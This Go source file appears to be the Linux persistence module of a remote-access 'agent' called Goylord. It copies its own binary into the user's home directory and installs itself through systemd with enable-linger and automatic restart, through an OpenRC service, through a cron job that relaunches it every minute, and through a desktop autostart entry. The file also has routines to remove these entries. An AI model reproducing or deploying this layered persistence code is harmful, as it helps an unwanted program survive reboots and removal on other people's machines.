//go:build linux
// +build linux

package persistence

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"text/template"
)

var activateLinuxPersistence = true

var runLinuxCommand = func(name string, args ...string) ([]byte, error) {
	return exec.Command(name, args...).CombinedOutput()
}

var runLinuxCommandInput = func(input []byte, name string, args ...string) ([]byte, error) {
	cmd := exec.Command(name, args...)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return nil, err
	}
	go func() {
		defer stdin.Close()
		_, _ = stdin.Write(input)
	}()
	return cmd.CombinedOutput()
}

var currentEUID = os.Geteuid

var currentUserHomeDir = func() (string, error) {
	usr, err := user.Current()
	if err != nil {
		return "", err
	}
	if usr.HomeDir == "" {
		return "", fmt.Errorf("current user home directory is empty")
	}
	return usr.HomeDir, nil
}

const systemdService = `[Unit]
Description=Goylord Agent
After=network.target

[Service]
Type=simple
ExecStart={{.ExePath}}
Restart=always
RestartSec=3
ProtectSystem=full
NoNewPrivileges=false
{{- if .WatchdogSec}}
WatchdogSec={{.WatchdogSec}}
{{- end}}
[Install]
WantedBy={{.WantedBy}}
`

const desktopEntry = `[Desktop Entry]
Type=Application
Name=Goylord Agent
Exec={{.ExePath}}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
`

const openRCScript = `#!/sbin/openrc-run
description="Goylord Agent"
command={{.ExePath}}
command_background=true
pidfile="${XDG_RUNTIME_DIR:-/tmp}/{{.ServiceName}}.pid"
respawn_delay=10
respawn_max=0
`

func binaryName() string {
	if DefaultStartupName != "" {
		return DefaultStartupName
	}
	return "agent"
}

func getSystemdPath() (string, error) {
	if currentEUID() == 0 {
		return filepath.Join(string(filepath.Separator), "etc", "systemd", "system", binaryName()+".service"), nil
	}
	homeDir, err := currentUserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homeDir, ".config", "systemd", "user", binaryName()+".service"), nil
}

func getAutostartPath() (string, error) {
	homeDir, err := currentUserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homeDir, ".config", "autostart", binaryName()+".desktop"), nil
}

func getOpenRCPath() (string, error) {
	name := openRCServiceName()
	if currentEUID() == 0 {
		return filepath.Join(string(filepath.Separator), "etc", "init.d", name), nil
	}
	homeDir, err := currentUserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homeDir, ".config", "openrc", "init.d", name), nil
}

func getTargetPath() (string, error) {
	homeDir, err := currentUserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homeDir, ".local", "share", "goylord", binaryName()), nil
}

func install(exePath string) error {

	targetPath, err := getTargetPath()
	if err != nil {
		return fmt.Errorf("failed to get target path: %w", err)
	}

	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create goylord directory: %w", err)
	}

	if err := replaceExecutable(exePath, targetPath); err != nil {
		return err
	}

	return installLinuxStartup(targetPath)
}

func replaceExecutable(exePath, targetPath string) error {
	srcFile, err := os.Open(exePath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer srcFile.Close()

	dir := filepath.Dir(targetPath)
	tmpFile, err := os.CreateTemp(dir, "agent-*.tmp")
	if err != nil {
		return fmt.Errorf("failed to create temp executable: %w", err)
	}
	tmpPath := tmpFile.Name()
	defer func() {
		_ = tmpFile.Close()
		_ = os.Remove(tmpPath)
	}()

	if _, err := io.Copy(tmpFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable: %w", err)
	}
	if err := tmpFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync temp file: %w", err)
	}
	if err := tmpFile.Close(); err != nil {
		return fmt.Errorf("failed to close temp file: %w", err)
	}

	if err := os.Rename(tmpPath, targetPath); err != nil {
		if removeErr := os.Remove(targetPath); removeErr == nil {
			err = os.Rename(tmpPath, targetPath)
		}
		if err != nil {
			return fmt.Errorf("failed to replace executable at %s: %w", targetPath, err)
		}
	}

	if err := os.Chmod(targetPath, 0755); err != nil {
		return fmt.Errorf("failed to set executable permissions: %w", err)
	}

	return nil
}

func installSystemd(exePath string) error {
	servicePath, err := getSystemdPath()
	if err != nil {
		return err
	}

	dir := filepath.Dir(servicePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create systemd directory: %w", err)
	}

	file, err := os.Create(servicePath)
	if err != nil {
		return fmt.Errorf("failed to create service file: %w", err)
	}

	tmpl, err := template.New("service").Parse(systemdService)
	if err != nil {
		_ = file.Close()
		return fmt.Errorf("failed to parse template: %w", err)
	}

	isSystem := currentEUID() == 0
	wantedBy := "default.target"
	if !isSystem {
		wantedBy = "default.target"
	}

	data := struct {
		ExePath     string
		WantedBy    string
		WatchdogSec string
	}{
		ExePath:     exePath,
		WantedBy:    wantedBy,
		WatchdogSec: "60",
	}

	if err := tmpl.Execute(file, data); err != nil {
		_ = file.Close()
		return fmt.Errorf("failed to write service file: %w", err)
	}
	if err := file.Close(); err != nil {
		return fmt.Errorf("failed to close service file: %w", err)
	}

	if activateLinuxPersistence {
		if err := activateSystemd(servicePath); err != nil {
			return fmt.Errorf("failed to activate systemd service: %w", err)
		}
	}

	return nil
}

func configure(exePath string) error {
	return installLinuxStartup(exePath)
}

func installLinuxStartup(exePath string) error {
	var firstErr error
	for _, fn := range []func(string) error{
		installSystemd,
		installOpenRC,
		installCronFallbackIfActive,
		installAutostart,
	} {
		if err := fn(exePath); err == nil {
			return nil
		} else if firstErr == nil {
			firstErr = err
		}
	}
	return firstErr
}

func installAutostart(exePath string) error {
	autostartPath, err := getAutostartPath()
	if err != nil {
		return err
	}

	dir := filepath.Dir(autostartPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create autostart directory: %w", err)
	}

	file, err := os.Create(autostartPath)
	if err != nil {
		return fmt.Errorf("failed to create desktop entry: %w", err)
	}
	defer file.Close()

	tmpl, err := template.New("desktop").Parse(desktopEntry)
	if err != nil {
		return fmt.Errorf("failed to parse template: %w", err)
	}

	data := struct {
		ExePath string
	}{
		ExePath: exePath,
	}

	if err := tmpl.Execute(file, data); err != nil {
		return fmt.Errorf("failed to write desktop entry: %w", err)
	}

	return nil
}

func installOpenRC(exePath string) error {
	servicePath, err := getOpenRCPath()
	if err != nil {
		return err
	}

	dir := filepath.Dir(servicePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create OpenRC directory: %w", err)
	}

	file, err := os.Create(servicePath)
	if err != nil {
		return fmt.Errorf("failed to create OpenRC service: %w", err)
	}

	tmpl, err := template.New("openrc").Parse(openRCScript)
	if err != nil {
		_ = file.Close()
		return fmt.Errorf("failed to parse OpenRC template: %w", err)
	}

	data := struct {
		ExePath     string
		ServiceName string
	}{
		ExePath:     shellQuote(exePath),
		ServiceName: openRCServiceName(),
	}

	if err := tmpl.Execute(file, data); err != nil {
		_ = file.Close()
		return fmt.Errorf("failed to write OpenRC service: %w", err)
	}
	if err := file.Close(); err != nil {
		return fmt.Errorf("failed to close OpenRC service: %w", err)
	}
	if err := os.Chmod(servicePath, 0755); err != nil {
		return fmt.Errorf("failed to set OpenRC service permissions: %w", err)
	}

	if activateLinuxPersistence {
		if err := activateOpenRC(servicePath); err != nil {
			return fmt.Errorf("failed to activate OpenRC service: %w", err)
		}
	}

	return nil
}

func uninstall() error {

	var lastErr error

	if servicePath, err := getSystemdPath(); err == nil {
		if err := os.Remove(servicePath); err != nil && !os.IsNotExist(err) {
			lastErr = fmt.Errorf("failed to remove systemd service: %w", err)
		}
	}

	if autostartPath, err := getAutostartPath(); err == nil {
		if err := os.Remove(autostartPath); err != nil && !os.IsNotExist(err) {
			lastErr = fmt.Errorf("failed to remove autostart entry: %w", err)
		}
	}

	if err := removeOpenRC(); err != nil {
		lastErr = err
	}

	if err := removeCronFallback(); err != nil {
		lastErr = err
	}

	if targetPath, err := getTargetPath(); err == nil {
		os.Remove(targetPath)
	}

	return lastErr
}

func activateSystemd(servicePath string) error {
	serviceName := filepath.Base(servicePath)
	isSystem := currentEUID() == 0

	systemctl := "systemctl"
	if !isSystem {
		systemctl = "systemctl"
	}

	if !isSystem {
		if out, err := runLinuxCommand("loginctl", "enable-linger", os.Getenv("USER")); err == nil {
			_ = out
		}
	}

	cmdPrefix := []string{}
	if !isSystem {
		cmdPrefix = []string{"--user"}
	}

	if out, err := runLinuxCommand(systemctl, append(cmdPrefix, "daemon-reload")...); err != nil {
		return fmt.Errorf("systemctl daemon-reload: %w: %s", err, strings.TrimSpace(string(out)))
	}
	if out, err := runLinuxCommand(systemctl, append(cmdPrefix, "enable", servicePath)...); err != nil {
		return fmt.Errorf("systemctl enable: %w: %s", err, strings.TrimSpace(string(out)))
	}
	if out, err := runLinuxCommand(systemctl, append(cmdPrefix, "restart", serviceName)...); err != nil {
		return fmt.Errorf("systemctl restart: %w: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

func activateOpenRC(servicePath string) error {
	serviceName := filepath.Base(servicePath)
	if currentEUID() == 0 {
		if out, err := runLinuxCommand("rc-update", "add", serviceName, "default"); err != nil {
			return fmt.Errorf("rc-update add: %w: %s", err, strings.TrimSpace(string(out)))
		}
		if out, err := runLinuxCommand("rc-service", serviceName, "restart"); err != nil {
			return fmt.Errorf("rc-service restart: %w: %s", err, strings.TrimSpace(string(out)))
		}
		return nil
	}

	if out, err := runLinuxCommand("rc-update", "--user", "add", serviceName, "default"); err != nil {
		return fmt.Errorf("rc-update --user add: %w: %s", err, strings.TrimSpace(string(out)))
	}
	if out, err := runLinuxCommand("rc-service", "--user", serviceName, "restart"); err != nil {
		return fmt.Errorf("rc-service --user restart: %w: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

func removeOpenRC() error {
	servicePath, err := getOpenRCPath()
	if err != nil {
		return nil
	}

	if _, statErr := os.Stat(servicePath); statErr != nil {
		if os.IsNotExist(statErr) {
			return nil
		}
		return fmt.Errorf("failed to stat OpenRC service: %w", statErr)
	}

	serviceName := filepath.Base(servicePath)
	if activateLinuxPersistence {
		if currentEUID() == 0 {
			_, _ = runLinuxCommand("rc-service", serviceName, "stop")
			_, _ = runLinuxCommand("rc-update", "del", serviceName, "default")
		} else {
			_, _ = runLinuxCommand("rc-service", "--user", serviceName, "stop")
			_, _ = runLinuxCommand("rc-update", "--user", "del", serviceName, "default")
		}
	}

	if err := os.Remove(servicePath); err != nil && !os.IsNotExist(err) {
		return fmt.Errorf("failed to remove OpenRC service: %w", err)
	}
	return nil
}

func installCronFallbackIfActive(exePath string) error {
	if !activateLinuxPersistence {
		return fmt.Errorf("cron fallback activation disabled")
	}
	return installCronFallback(exePath)
}

func cronMarker() string {
	return "# goylord-agent:" + binaryName()
}

func cronCommand(exePath string) string {
	quotedExe := shellQuote(exePath)
	return fmt.Sprintf("* * * * * pgrep -u \"$USER\" -fx %s >/dev/null 2>&1 || %s >/dev/null 2>&1 &", quotedExe, quotedExe)
}

func installCronFallback(exePath string) error {
	existing, err := currentCrontab()
	if err != nil {
		return err
	}
	next := withoutCronFallback(existing)
	if strings.TrimSpace(next) != "" && !strings.HasSuffix(next, "\n") {
		next += "\n"
	}
	next += cronMarker() + "\n" + cronCommand(exePath) + "\n"
	if out, err := runLinuxCommandInput([]byte(next), "crontab", "-"); err != nil {
		return fmt.Errorf("crontab install: %w: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

func removeCronFallback() error {
	existing, err := currentCrontab()
	if err != nil {
		return err
	}
	next := withoutCronFallback(existing)
	if next == existing {
		return nil
	}
	if out, err := runLinuxCommandInput([]byte(next), "crontab", "-"); err != nil {
		return fmt.Errorf("failed to remove cron fallback: %w: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

func currentCrontab() (string, error) {
	out, err := runLinuxCommand("crontab", "-l")
	if err != nil {
		text := strings.ToLower(string(out))
		if strings.Contains(text, "no crontab") || strings.Contains(text, "no crontab for") {
			return "", nil
		}
		return "", fmt.Errorf("crontab -l: %w: %s", err, strings.TrimSpace(string(out)))
	}
	return string(out), nil
}

func withoutCronFallback(crontab string) string {
	lines := strings.Split(crontab, "\n")
	out := make([]string, 0, len(lines))
	skipNext := false
	removed := false
	for _, line := range lines {
		if skipNext {
			skipNext = false
			removed = true
			continue
		}
		if strings.TrimSpace(line) == cronMarker() {
			skipNext = true
			removed = true
			continue
		}
		out = append(out, line)
	}
	if !removed {
		return crontab
	}
	return strings.TrimRight(strings.Join(out, "\n"), "\n")
}

func shellQuote(value string) string {
	return "'" + strings.ReplaceAll(value, "'", "'\"'\"'") + "'"
}

func openRCServiceName() string {
	raw := strings.TrimSpace(binaryName())
	var builder strings.Builder
	for _, r := range raw {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' {
			builder.WriteRune(r)
		} else {
			builder.WriteByte('_')
		}
	}
	name := strings.Trim(builder.String(), "._-")
	if name == "" {
		return "agent"
	}
	return name
}

func removeCurrentInstall(currentExe string) error {
	currentExe = filepath.Clean(strings.TrimSpace(currentExe))
	if currentExe == "" || !currentProcessOwnsPath(currentExe) {
		return nil
	}

	var lastErr error
	if servicePath, err := getSystemdPath(); err == nil && startupFileReferences(servicePath, "ExecStart=", currentExe) {
		if err := os.Remove(servicePath); err != nil && !os.IsNotExist(err) {
			lastErr = fmt.Errorf("failed to remove current systemd service: %w", err)
		}
	}
	if autostartPath, err := getAutostartPath(); err == nil && startupFileReferences(autostartPath, "Exec=", currentExe) {
		if err := os.Remove(autostartPath); err != nil && !os.IsNotExist(err) {
			lastErr = fmt.Errorf("failed to remove current autostart entry: %w", err)
		}
	}
	if openRCPath, err := getOpenRCPath(); err == nil && startupFileContainsExecutable(openRCPath, currentExe) {
		if err := os.Remove(openRCPath); err != nil && !os.IsNotExist(err) {
			lastErr = fmt.Errorf("failed to remove current OpenRC service: %w", err)
		}
	}
	if targetPath, err := getTargetPath(); err == nil && filepath.Clean(targetPath) == currentExe {
		if err := os.Remove(targetPath); err != nil && !os.IsNotExist(err) {
			lastErr = fmt.Errorf("failed to remove current executable: %w", err)
		}
	}
	return lastErr
}

func startupFileReferences(path string, prefix string, exePath string) bool {
	data, err := os.ReadFile(path)
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.TrimSpace(line) == prefix+exePath {
			return true
		}
	}
	return false
}

func startupFileContainsExecutable(path string, exePath string) bool {
	data, err := os.ReadFile(path)
	if err != nil {
		return false
	}
	return strings.Contains(string(data), shellQuote(exePath)) || strings.Contains(string(data), exePath)
}

func currentProcessOwnsPath(path string) bool {
	procInfo, err := os.Stat("/proc/self/exe")
	if err != nil {
		return false
	}
	pathInfo, err := os.Stat(path)
	if err != nil {
		return false
	}
	return os.SameFile(procInfo, pathInfo)
}
